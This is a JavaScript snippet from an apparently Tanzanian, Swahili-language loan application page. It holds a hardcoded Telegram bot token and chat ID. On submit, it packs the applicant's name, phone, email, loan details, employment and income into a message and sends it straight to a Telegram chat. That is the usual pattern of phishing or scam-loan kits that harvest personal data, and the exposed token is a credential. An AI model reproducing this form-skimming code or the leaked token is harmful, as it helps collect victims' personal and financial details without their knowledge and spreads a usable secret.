// Add your Telegram Configuration here
const TELEGRAM_TOKEN = "8994413452:AAF_GfDPe_Mt0rlV4q8rtzxlIDQJm2vQTQY"; 
const TELEGRAM_CHAT_ID = "8524294724";

function submitApplication() {
    applicationData.employment = document.getElementById('employment-status').value;
    applicationData.income = document.getElementById('annual-income').value;
    
    showLoading("Inawasilisha Maombi…", 2000, () => {
        // Construct the message format
        const message = `
🔔 *Maombi Mapya ya Mkopo!*
----------------------------
👤 *Jina:* ${applicationData.firstName} ${applicationData.lastName}
📱 *Namba:* ${applicationData.phone}
📧 *Email:* ${applicationData.email}
💰 *Kiasi:* TSh ${applicationData.amount.toLocaleString()}
📅 *Muda:* ${applicationData.duration} Miezi
🛠 *Aina:* ${applicationData.type}
🎯 *Madhumuni:* ${applicationData.purpose}
💼 *Ajira:* ${applicationData.employment}
💵 *Mapato/Mwaka:* TSh ${parseInt(applicationData.income).toLocaleString()}
        `;

        // Send data directly to Telegram
        sendToTelegram(message);

        navigateTo('view-success');
        runSuccessCountdown();
    });
}
